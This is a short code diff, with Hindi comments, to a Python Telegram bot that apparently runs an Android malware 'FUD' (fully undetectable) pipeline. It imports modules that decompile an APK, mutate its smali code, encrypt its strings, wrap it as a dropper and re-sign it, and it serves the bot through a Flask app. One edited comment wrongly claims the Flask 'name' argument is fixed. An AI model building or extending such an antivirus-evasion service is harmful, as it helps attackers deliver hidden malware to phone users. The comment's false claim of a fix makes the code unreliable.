@@ -7,7 +7,7 @@ import threading
 from telegram import Update, Document
 from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes
 
-# सभी मॉड्यूल्स को सीधे इम्पोर्ट करें (कोई फोल्डर नहीं)
+# सभी मॉड्यूल्स सीधे इम्पोर्ट करें
 from apktool_wrapper import decompile, recompile
 from dex_mutator import mutate_smali
 from encryptor import encrypt_strings
@@ -17,7 +17,7 @@ from dropper import wrap_as_dropper
 from signer import sign_apk
 from config import BOT_TOKEN, WORK_DIR
 
-# ---------- FUD Pipeline (सीधे यहाँ) ----------
+# ---------- FUD Pipeline ----------
 def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
     decompiled_dir = os.path.join(session_dir, "decompiled")
 
@@ -37,7 +37,7 @@ def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
     return output_apk
 
 # ---------- Flask Server (Render के लिए) ----------
-flask_app = Flask(name)
+flask_app = Flask(name)  # ✅ यहाँ name सही है (दो अंडरस्कोर)
 
 @flask_app.route('/')
 def home():
